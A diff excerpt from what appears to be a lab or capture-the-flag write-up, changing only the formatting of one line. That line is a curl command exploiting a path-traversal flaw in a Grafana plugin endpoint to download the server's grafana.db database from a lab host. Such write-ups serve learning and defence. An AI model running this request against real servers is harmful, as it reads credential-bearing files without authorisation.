@@ -25,7 +25,7 @@ I have used an exploit to download the database file:
 
 But the same result can be obtained making the following request with curl:
 
-**curl http://10.129.234.47:3000/public/plugins/stat/../../../../../../../../../../../../../../../../var/lib/grafana/grafana.db --path-as-is -o file_db**
+**curl `http://10.129.234.47:3000/public/plugins/stat/../../../../../../../../../../../../../../../../var/lib/grafana/grafana.db` --path-as-is -o file_db**
 
 Checking the type of the .db file we can see that is a Sqlite3 file:
 
